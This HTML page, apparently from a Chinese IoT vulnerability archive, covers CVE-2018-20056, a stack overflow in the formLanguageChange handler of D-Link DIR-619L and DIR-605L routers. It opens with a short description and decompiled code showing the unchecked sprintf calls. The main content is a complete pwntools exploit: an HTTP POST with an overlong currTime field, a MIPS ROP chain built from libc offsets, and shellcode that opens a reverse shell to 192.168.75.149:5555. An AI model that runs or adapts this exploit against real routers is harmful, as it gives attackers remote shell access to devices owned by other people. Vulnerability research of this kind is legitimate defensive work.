<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X643188b4556848f1cecf6f825eedce9a40c811e"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-20056</span><span class="csECDA2D3">）</span><span class="csDE05BCC">D-Link DIR-619L&amp;605L </span><span class="csECDA2D3">栈溢出漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">D-LINK</span><span class="cs9C1B1871">的</span><span class="cs8926E06">DIR-619L Rev.B 2.06B1</span><span class="cs9C1B1871">版本之前和</span><span class="cs8926E06">DIR-605L Rev.B 2.12B1</span><span class="cs9C1B1871">版本之前的设备，在</span><span class="cs8926E06">/bin/boa</span><span class="cs9C1B1871">文件的</span><span class="cs8926E06">formLanguage</span><span class="cs9C1B1871">函数中存在缓冲区溢出漏洞，在调用</span><span class="cs8926E06">sprintf</span><span class="cs9C1B1871">函数时没有对参数的长度进行检查，导致远程攻击者可以通过访问</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://[ip]/goform/formLanguageChange</span><span class="cs7FFD2630">并指定</span><span class="cs9FB05234">currTime</span><span class="cs7FFD2630">参数实现远程代码执行。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">固件下载地址：</span><span class="cs8926E06">ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">D-LINK</span><span class="cs9C1B1871">的</span><span class="cs8926E06">DIR-619L Rev.B 2.06B1</span><span class="cs9C1B1871">版本之前和</span><span class="cs8926E06">DIR-605L Rev.B 2.12B1</span><span class="cs9C1B1871">版本之前的设备。</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">formLanguageChange</span><span class="cs9C1B1871">函数中，通过</span><span class="cs8926E06">websGetVar</span><span class="cs9C1B1871">获取</span><span class="cs8926E06">config.i18n_language</span><span class="cs9C1B1871">，</span><span class="cs8926E06">nextPage</span><span class="cs9C1B1871">，</span><span class="cs8926E06">currTime</span><span class="cs9C1B1871">等参数。</span><span class="cs8926E06">websGetVar</span><span class="cs9C1B1871">通过</span><span class="cs8926E06">malloc</span><span class="cs9C1B1871">、</span><span class="cs8926E06">memcpy</span><span class="cs9C1B1871">将获取到的参数返回给</span><span class="cs8926E06">formLanguageChange</span><span class="cs9C1B1871">。</span><span class="cs8926E06">formLanguageChange</span><span class="cs9C1B1871">接下来调用了</span><span class="cs8926E06">sprintf</span><span class="cs9C1B1871">危险函数向</span><span class="cs8926E06">local_f8</span><span class="cs9C1B1871">变量中读入参数内容，并在下一步</span><span class="cs8926E06">websRedirect</span><span class="cs9C1B1871">使用了</span><span class="cs8926E06">local_f8</span><span class="cs9C1B1871">作为参数。</span></p><p class="cs3A447A38"><span class="cs9FB05234">void formLanguageChange(undefined4 uParm1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;int iVar1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char *pcVar2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;undefined4 uVar3;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;FILE *__stream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char *__s1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char local_f8 [200];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char acStack48 [24];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;undefined4 local_18;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;int local_14;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;__s1 = (char *)websGetVar(uParm1,&quot;config.i18n_language&quot;,&amp;DAT_004ac874);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;apmib_set(0x129,&amp;local_18);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;__s1 = (char *)websGetVar(uParm1,&quot;nextPage&quot;,&amp;DAT_004ac874);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if (*__s1 == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uVar3 = websGetVar(uParm1,&quot;currTime&quot;,&amp;DAT_004ac874);//</span><span class="cs7FFD2630">获取</span><span class="cs9FB05234">currTime</span><span class="cs7FFD2630">参数</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;__s1 = &quot;/index.asp&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;sprintf(local_f8,&quot;%s?t=%s&quot;,__s1,uVar3);//</span><span class="cs7FFD2630">危险函数</span><span class="cs9FB05234">sprintf</span><span class="cs7FFD2630">直接读入字符</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">LAB_00460b34:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;websRedirect(uParm1,local_f8);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">websRedirect</span><span class="cs9C1B1871">主要调用</span><span class="cs9FB05234">send_r_moved_perm</span><span class="cs9C1B1871">，这个函数调用了两次危险函数</span><span class="cs8926E06">sprintf</span><span class="cs9C1B1871">，分别向</span><span class="cs8926E06">acStack224(sp+0x19f8-0xe0)</span><span class="cs9C1B1871">和</span><span class="cs8926E06">acStack480(sp+0x19f8-0x1e0)</span><span class="cs9C1B1871">中输入字符。</span></p><p class="cs3A447A38"><span class="cs9FB05234">undefined4 websRedirect(int iParm1,char *pcParm2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char *pcVar1;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;*(undefined4 *)(iParm1 + 0x50) = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;pcVar1 = strstr(pcParm2,&quot;/apply_setting.asp&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if (pcVar1 != (char *)0x0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apply_setting_redirect = apply_setting_redirect + 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;send_r_moved_perm(iParm1,pcParm2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">void send_r_moved_perm(int iParm1,char *pcParm2)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;undefined4 uVar1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char *pcVar2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;undefined auStack6624 [6144];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char acStack480 [256];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char acStack224 [200];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&hellip;&hellip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if (pcVar2 == (char *)0x0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (*pcParm2 == &#39;/&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pcParm2 = pcParm2 + 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sprintf(acStack224,&quot;http://%s/%s&quot;,*(undefined4 *)(iParm1 + 0x70),pcParm2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pcParm2 = acStack224;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;sprintf(acStack480,</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;\r\n\t\tThis document has moved to a new &lt;ahref=\&quot;%s\&quot;&gt;location&lt;/a&gt;.\r\n\t\tPlease update your documents to reflect the newlocation.\r\n\t\t&lt;/body&gt;&lt;/html&gt;\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,pcParm2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&hellip;&hellip;s</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过第二两个</span><span class="cs8926E06">sprintf</span><span class="cs9C1B1871">修改返回地址，构造</span><span class="cs8926E06">ROP</span><span class="cs9C1B1871">链，导致程序控制流被劫持。（也可以通过两个</span><span class="cs8926E06">sprintf</span><span class="cs9C1B1871">的配合来实现栈的迁移，漏洞作者是这么实现的）</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<h4 class="cs868C439D">
			<a name="poc"><span class="csBF12A472">poc</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import struct</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from pwn import *</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#context.log_level=&#39;debug&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">context.arch=&#39;mips&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">context.endian=&#39;big&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ip=&#39;192.168.75.150&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def syscmd1(a):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;p=remote(ip,80)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;z=len(a)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &quot;[+]len:&quot;+str(z)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload=&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;POST /goform/formLanguageChange HTTP/1.1\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;Host: &#39;+ip+&#39;\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;Connection: keep-alive\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;Accept-Encoding: gzip, deflate\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;Accept: */*\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;User-Agent: python-requests/2.18.4\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;Content-Length: &#39;+str(z+9)+&#39;\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;Content-Type: application/x-www-form-urlencoded\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=&#39;currTime=&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload+=a+&#39;\r\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;p.send(payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;p.recvuntil(&#39;&lt;/html&gt;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#raw_input()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;p.close()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#base address of libc.so.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">base1=0x2ab88000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">###shellcode</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc=struct.pack(&quot;&gt;I&quot;,0x24060101)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0x04d0ffff)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0x2806ffff)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0x27bdffe0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0x27e41001)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0x2484f023)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0xafa4ffe8)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0xafa0ffec)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0x27a5ffe8)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0x24020fab)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0xafa00108)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=struct.pack(&quot;&gt;I&quot;,0x0101010c)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sc+=&quot;/bin//sh\x00&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">shellcode =&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shellcode += asm(shellcraft.connect(&#39;192.168.75.149&#39;,5555))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shellcode += asm(shellcraft.dup2(5,0))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shellcode += asm(shellcraft.dup2(5,1))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shellcode += sc</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">s0=struct.pack(&quot;&gt;I&quot;,base1+0x2C794)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">s1=struct.pack(&quot;&gt;I&quot;,base1+0x2C794)### rop2:move $t9,$s2;...;jr $t9 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">s2=struct.pack(&quot;&gt;I&quot;,base1+0x24b70)### rop3:sleep(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">s3=struct.pack(&quot;&gt;I&quot;,base1+0x2bdac)### rop5:addiu $a0,$sp,0x18;...;lw $ra,0x30;jr $ra</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">s4=struct.pack(&quot;&gt;I&quot;,base1+0x2bdac)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">###rop</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1=&#39;a&#39;*0x167+s0+s1+s2+s3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=struct.pack(&quot;&gt;I&quot;,base1+0x25714) &nbsp;###rop1: li $a0,1;move $t9,$s1;jalr $t9;ori $a1,$s0,2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=&#39;b&#39;*0x1c+s0+s1+s2+s3+s4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=struct.pack(&quot;&gt;I&quot;,base1+0x5f98) &nbsp;###rop4:lw $ra,0x1c($sp);...;jr $ra</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=&#39;c&#39;*0x1c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=s3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=&#39;d&#39;*0x18</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=struct.pack(&quot;&gt;I&quot;,0x24910101) ###rop7 addiu $s1,$a0,257;addi $s1,$s1,-257;move $t9,$s1;jalr $t9</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=struct.pack(&quot;&gt;I&quot;,0x2231feff)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=struct.pack(&quot;&gt;I&quot;,0x0220c821)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=struct.pack(&quot;&gt;I&quot;,0x0320f809)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=struct.pack(&quot;&gt;I&quot;,0x2231feff)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=struct.pack(&quot;&gt;I&quot;,0x2231feff)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=struct.pack(&quot;&gt;I&quot;,base1+0x2bda0) ###rop6:mov $t9,$a0;...;jalr $t9</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload1+=&#39;e&#39;*0x20+shellcode</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;syscmd1(payload1)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用效果</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/D-Link/%ef%bc%88CVE-2018-20056%ef%bc%89D-Link%20DIR-619L&605L%20%e6%a0%88%e6%ba%a2%e5%87%ba%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="88" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
</html>
